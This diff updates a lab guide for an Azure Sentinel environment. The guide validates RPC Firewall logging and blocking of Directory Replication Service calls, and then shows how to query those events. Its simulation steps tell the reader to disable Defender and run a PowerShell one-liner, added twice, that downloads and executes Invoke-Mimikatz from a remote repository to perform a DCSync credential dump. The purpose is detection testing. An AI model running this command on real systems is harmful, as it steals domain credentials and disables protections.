@@ -35,27 +35,95 @@
     * Access via Azure Bastion (Recommended. Additional costs applied)
     * Restrict Access to one Public IP Address (For example, Home Public IP Address)
 
-## Validate Deployment
+## Validate Event Generation
 
-## Simulations
+1. RDP to DC01
+2. Open Event Viewer and go to `Applications and Services Logs` > `RPCFWP`
 
-### Monitoring Directory Replication Service (DRS) Remote Protocol
+![](../../resources/images/win10-rpcfw_check_events.png)
+
+## Validate Event Collection
+
+1. RDP to WEC01
+2. Open Event Viewer and go to `Windows Logs` > `Forwarded Events`
+
+![](../../resources/images/win10-rpcfw_forwarded_events.png)
+
+3. In Event Viewer, go to `Subscriptions`
+
+![](../../resources/images/win10-rpcfw_windows_subscriptions_queries.png)
+
+4. Go to [https://portal.azure.com/](https://portal.azure.com/) and search for "Microsoft Sentinel". You should see logs flowing 5-10 minutes after the deployment of the environment. Events will be available in the `WindowsEvents` table.
+
+![](../../resources/images/win10-rpcfw_check_mssentinel.png)
+
+## Validate RPC Firewall Capabilities
+### Monitor Directory Replication Service (DRS) RPC Calls
 
 1. Validate that the domain controller contains the `RpcFw.conf` file in the `C:\ProgramData` folder.
 2. Validate that the following entry exists in the config file:
 
 ```
-uuid:e3514235-4b06-11d1-ab04-00c04fc2dcd2 action:allow audit:true
+uuid:e3514235-4b06-11d1-ab04-00c04fc2dcd2 action:allow audit:true verbose:true
 ```
 
-3. Open PowerShell and run the following commands:
+3. If you update the configuration, make sure you run the following command:
 
 ```PowerShell
-IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -Command '"lsadump::dcsync /domain:azsentinel.local /user:azsentinel\pgustavo" "exit"
+.\RpcFwManager.exe /update
 ```
 
-4. Check Event Viewer > Applications and Services Logs > RPCFW
+4. Disable Defender
+5. Open PowerShell as an Administrator and run the following commands:
+
+```PowerShell
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -Command '"lsadump::dcsync /domain:mssentinel.local /user:mssentinel\pgustavo" "exit"'
+```
+
+6. Open Event Viewer and go to `Applications and Services Logs` > `RPCFWP`
+
+![](../../resources/images/win10-rpcfw_mk_dcsync.png)
+
+### Block Directory Replication Service (DRS) RPC Calls
+
+1. Validate that the domain controller contains the `RpcFw.conf` file in the `C:\ProgramData` folder.
+2. Validate that the following entry exists in the config file:
+
+```
+uuid:e3514235-4b06-11d1-ab04-00c04fc2dcd2 addr:127.0.0.1 action:allow
+uuid:e3514235-4b06-11d1-ab04-00c04fc2dcd2 action:block audit:true verbose:true
+```
+
+3. If you update the configuration, make sure you run the following command:
+
+```PowerShell
+.\RpcFwManager.exe /update
+```
+
+4. Disable Defender
+5. Open PowerShell as an Administrator and run the following commands:
+
+```PowerShell
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -Command '"lsadump::dcsync /domain:mssentinel.local /user:mssentinel\pgustavo" "exit"'
+```
+4. Open Event Viewer and go to `Applications and Services Logs` > `RPCFWP`
+
+![](../../resources/images/win10-rpcfw_block_replication_event.png)
+
+## Query Events in Microsoft Sentinel
+
+1. Go to [https://portal.azure.com/](https://portal.azure.com/) and search for "Microsoft Sentinel".
+2. Go to `logs`
+3. There will be a function / parser already available for you to query RPC Firewall events:
+
+![](../../resources/images/win10-rpcfw_query_rpcfirewall_limit10.png)
+
+4. Run a basic query to find the use of Directory Replication Services (DRS) in your environment:
+
+![](../../resources/images/win10-rpcfw_query_rpcfirewall_where_replication.png)
 
 ## References:
 * https://github.com/Cyb3rWard0g/WinRpcFunctions
 * https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/06205d97-30da-4fdc-a276-3fd831b272e0
+* https://github.com/zeronetworks/rpcfirewall
+* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/58f33216-d9f1-43bf-a183-87e3c899c410
